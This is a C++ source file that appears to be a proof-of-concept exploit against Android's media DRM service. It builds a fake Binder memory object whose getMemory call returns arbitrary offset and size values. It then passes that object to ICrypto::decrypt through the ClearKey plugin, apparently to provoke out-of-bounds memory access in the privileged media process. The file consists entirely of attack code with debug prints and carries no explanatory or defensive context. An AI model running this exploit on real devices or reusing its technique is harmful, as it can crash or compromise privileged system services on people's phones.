
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <utils/Log.h>

#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>

#include <gui/ISurfaceComposer.h>
#include <gui/BufferQueue.h>
#include <gui/CpuConsumer.h>
#include <unistd.h>
extern "C"{
#include <NdkMediaCrypto.h>
#include <NdkMediaDrm.h>
}
#include <media/ICrypto.h>
#include "AString.h"
#include "MediaErrors.h"
#include <binder/MemoryDealer.h>
#include <binder/TextOutput.h> 

using namespace android ; 

class FakeMemoryBase : public BnMemory   //Create a FakeMemoryBase
{
public:
    FakeMemoryBase(const sp<IMemoryHeap>& heap, ssize_t offset, size_t size) : mSize(size), mOffset(offset), mHeap(heap){
    }
    virtual ~FakeMemoryBase(){
    }
    virtual sp<IMemoryHeap> getMemory(ssize_t* offset, size_t* size) const {
        //if (offset) *offset = mOffset;
        //if (size)   *size = mSize;  
        *offset =  0x12345678;     // return arbitrary offset and size when called from Binder proxy
        *size =  0x23456789 ;
        printf("[*]in GetMemory\n") ;
        return mHeap;
    }

protected:
    size_t getSize() const { return mSize; }
    ssize_t getOffset() const { return mOffset; }
    const sp<IMemoryHeap>& getHeap() const { return mHeap; }

private:
    size_t          mSize;
    ssize_t         mOffset;
    sp<IMemoryHeap> mHeap;
};


static const uint8_t clearKeyUUID[16] = {            
    0x10,0x77,0xEF,0xEC,0xC0,0xB2,0x4D,0x02,   
    0xAC,0xE3,0x3C,0x1E,0x52,0xE2,0xFB,0x4B
};
struct AMediaCrypto {
    sp<ICrypto> mCrypto;
};


int main(){
    printf("[+]hello world\n") ;
    AMediaDrm * mediaDrm = AMediaDrm_createByUUID(clearKeyUUID)  ; 
    AMediaDrmSessionId sessionId ; 
    memset(&sessionId , 0 , sizeof(sessionId)) ;    
    if( AMediaDrm_openSession(mediaDrm,&sessionId) != AMEDIA_OK ){
        printf("[-]open session failed\n") ;
        return -1 ; 
    }
    AMediaCrypto* mediaCrypto = AMediaCrypto_new(clearKeyUUID, sessionId.ptr, sessionId.length);
    if( mediaCrypto == NULL){
        printf("[-]new Media Crypot failed\n") ; 
    }else{
        printf("[+]MediaCrypto created!\n") ; 
    }


    MemoryHeapBase *mHeap = new MemoryHeapBase(1024,PROT_READ|PROT_WRITE,"name") ;
    if( mHeap == NULL ){
        printf("[-] create MemoryHeapBase failed\n") ;
    }else{
        void* base = mHeap->base() ; 
        printf("[*]heap base : %x \n" , base) ; 
    }
    sp<IMemory> sharedMemory = new FakeMemoryBase(mHeap, 0 , 1024) ;  //heap , offset , size     

    CryptoPlugin::SubSample subSamples[1];
    subSamples[0].mNumBytesOfClearData=1024;
    subSamples[0].mNumBytesOfEncryptedData=0;

    AString errorDetailMsg ; 
    char dst[1024];

    mediaCrypto->mCrypto->decrypt(false,NULL,NULL,CryptoPlugin::kMode_Unencrypted,sharedMemory.get(),0,subSamples,1,dst,&errorDetailMsg);

    printf("[+]finish\n") ; 
    return 0 ;     
}
